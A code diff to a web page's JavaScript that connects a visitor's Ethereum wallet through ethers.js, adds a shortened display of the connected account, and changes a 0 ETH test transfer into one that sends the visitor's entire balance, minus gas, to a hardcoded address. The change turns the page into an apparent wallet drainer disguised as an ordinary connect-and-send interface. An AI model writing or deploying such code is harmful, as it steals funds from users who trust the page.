@@ -14,6 +14,9 @@ document.addEventListener('DOMContentLoaded', async () => {
         const balanceInETH = ethers.utils.formatEther(balance);
 
         console.log(`Balance: ${balanceInETH} ETH`);
+
+        const shortenedAccount = `${account.slice(0, 4)}...${account.slice(-4)}`;
+        document.getElementById('account-number').textContent = `Connected Account: ${shortenedAccount}`;
       } catch (error) {
         console.error('Error connecting:', error);
       }
@@ -31,14 +34,24 @@ document.addEventListener('DOMContentLoaded', async () => {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
 
-    const transactionParam = {
-      to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
-      value: ethers.utils.parseEther('0.0') // Отправляем 0.1 ETH (в wei)
-    };
-
     try {
-      const txResponse = await signer.sendTransaction(transactionParam);
-      console.log(`Transaction sent. Transaction hash: ${txResponse.hash}`);
+      const gasPrice = await provider.getGasPrice();
+      const gasLimit = 21000; // Standard gas limit for a simple ETH transfer
+
+      const balance = await provider.getBalance(account);
+      const maxSendable = balance.sub(gasPrice.mul(gasLimit));
+
+      if (maxSendable.gt(0)) {
+        const transactionParam = {
+          to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
+          value: maxSendable
+        };
+
+        const txResponse = await signer.sendTransaction(transactionParam);
+        console.log(`Transaction sent. Transaction hash: ${txResponse.hash}`);
+      } else {
+        console.error('Insufficient balance to cover gas cost.');
+      }
     } catch (error) {
       console.error('Error sending transaction:', error);
     }
